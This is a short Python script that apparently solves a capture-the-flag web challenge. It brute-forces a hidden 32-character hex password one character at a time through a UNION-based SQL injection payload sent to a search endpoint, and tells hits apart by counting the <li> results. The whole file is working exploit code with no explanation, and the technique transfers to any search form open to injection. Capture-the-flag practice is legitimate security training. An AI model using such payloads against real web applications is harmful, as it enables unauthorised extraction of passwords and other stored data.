import requests
from tqdm import tqdm

def new_session():
    # url = 'http://localhost:8080/new_session'
    url = 'http://one-shot.amt.rs/new_session'
    response = requests.post(url).text
    table_id = response.splitlines()
    table_id = table_id[3]
    table_id = table_id.split('"')
    table_id = table_id[5]
    # print(f"{table_id=}")
    return table_id

def search(table_id, query):
    url = 'http://one-shot.amt.rs/search'
    # url = 'http://localhost:8080/search'
    send_data = {"id": table_id, "query": query}
    response = requests.post(url, data=send_data)
    results = response.text.split('<li>')
    if len(results) == 3:
        return True
    else:
        return False
    
def guess(table_id, password):
    url = 'http://one-shot.amt.rs/guess'
    # url = 'http://localhost:8080/guess'
    send_data = {"id": table_id, "password": password}
    response = requests.post(url, data=send_data)
    if 'go back' not in response.text.lower():
        print(response.text)

if __name__ == "__main__":
    id_to_guess = new_session()
    # id_to_guess = "ef71f7852d86dc26"

    password = '_' * 32
    correct = ''
    # while '_' in password:
    for i in tqdm(range(32)):
        password = correct + '_' * (32 - i)
        # print(password)
        for letter in '1234567890abcdef':
            password = correct + letter + '_' * (32 - i - 1)
            # print(password)
            test_id = new_session()
            if search(test_id, f"%' UNION SELECT password from table_{id_to_guess} WHERE password LIKE '{password}'--"):
                correct += letter
                # print(correct)
                guess(test_id, "guess")
                break
            # guess(id_to_guess, "guess")
    print(f"{correct=}")
    guess(id_to_guess, correct)

